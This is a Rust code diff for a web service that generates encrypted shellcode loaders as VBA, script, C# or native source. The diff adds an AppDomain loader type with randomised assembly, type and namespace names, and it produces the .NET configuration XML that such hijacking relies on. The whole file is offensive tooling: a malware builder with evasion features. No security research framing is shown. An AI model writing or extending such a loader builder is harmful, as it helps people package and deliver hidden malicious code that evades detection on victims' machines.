@@ -12,19 +12,33 @@ use crate::{
 };
 use template_engine::{
     generate_loader_source, generate_script_source, generate_vba_source,
-    generate_csharp_source, Encryption, Feature, LoaderConfig, LoaderType,
+    generate_csharp_source, generate_appdomain_config,
+    AppDomainTemplateConfig,
+    Encryption, Feature, LoaderConfig, LoaderType, AppDomainConfig,
     OutputCategory,
 };
 
 #[derive(Deserialize)]
+pub struct AppDomainReq {
+    #[serde(default = "default_clr_version")]
+    pub clr_version: String,
+    #[serde(default = "default_net_version")]
+    pub net_version: String,
+}
+
+fn default_clr_version() -> String { "v4.0.30319".into() }
+fn default_net_version()  -> String { "4.0".into() }
+
+#[derive(Deserialize)]
 pub struct GenerateRequest {
-    pub loader_type:   String,
-    pub features:      Vec<String>,
-    pub encryption:    String,
-    pub shellcode_hex: String,
-    pub key_hex:       String,
-    pub iv_hex:        String,
-    pub pe_config:     Option<PeMetadata>,
+    pub loader_type:      String,
+    pub features:         Vec<String>,
+    pub encryption:       String,
+    pub shellcode_hex:    String,
+    pub key_hex:          String,
+    pub iv_hex:           String,
+    pub pe_config:        Option<PeMetadata>,
+    pub appdomain_config: Option<AppDomainReq>,
 }
 
 #[derive(Serialize)]
@@ -55,6 +69,19 @@ pub async fn generate(
     });
 
     (StatusCode::ACCEPTED, Json(GenerateResponse { job_id }))
+}
+
+fn rand_hex_ident(len: usize) -> String {
+    use rand::Rng;
+    let mut rng = rand::thread_rng();
+    let first = (rng.gen_range(b'a'..=b'z') as char).to_string();
+    let rest: String = (0..len.saturating_sub(1))
+        .map(|_| {
+            let n: u8 = rng.gen_range(0..36);
+            if n < 10 { (b'0' + n) as char } else { (b'a' + n - 10) as char }
+        })
+        .collect();
+    format!("{}{}", first, rest)
 }
 
 fn run_build(
@@ -143,6 +170,22 @@ fn run_build(
         return;
     }
 
+    let appdomain_config = if loader_type == LoaderType::AppDomain {
+        let req_ad = req.appdomain_config.unwrap_or(AppDomainReq {
+            clr_version: "v4.0.30319".into(),
+            net_version: "4.0".into(),
+        });
+        Some(AppDomainConfig {
+            clr_version:   req_ad.clr_version,
+            net_version:   req_ad.net_version,
+            assembly_name: rand_hex_ident(12),
+            type_name:     rand_hex_ident(10),
+            namespace:     rand_hex_ident(8),
+        })
+    } else {
+        None
+    };
+
     let loader_cfg = LoaderConfig {
         loader_type,
         features,
@@ -151,7 +194,7 @@ fn run_build(
         key_hex,
         iv_hex,
         pe_config:        None,
-        appdomain_config: None,
+        appdomain_config,
     };
 
     jobs.set_status(&job_id, JobStatus::Building { progress: 10, msg: "Generating source...".into() });
@@ -251,12 +294,24 @@ fn run_build(
 
     let download_id = uuid::Uuid::new_v4().to_string();
 
-    // Store download mapping: download_id -> artifact path
     let dl_link = PathBuf::from(&cfg.artifacts_dir).join(&download_id);
     let _ = std::fs::write(
         dl_link.with_extension("path"),
         out_path.to_str().unwrap(),
     );
 
-    jobs.set_status(&job_id, JobStatus::Done { download_id, config_xml: None });
+    let config_xml = if loader_cfg.loader_type == LoaderType::AppDomain {
+        loader_cfg.appdomain_config.as_ref().and_then(|ad| {
+            generate_appdomain_config(&AppDomainTemplateConfig {
+                clr_version:    ad.clr_version.clone(),
+                net_version:    ad.net_version.clone(),
+                appdomain_name: format!("{}.{}", ad.namespace, ad.type_name),
+                assembly_name:  ad.assembly_name.clone(),
+            }).ok()
+        })
+    } else {
+        None
+    };
+
+    jobs.set_status(&job_id, JobStatus::Done { download_id, config_xml });
 }
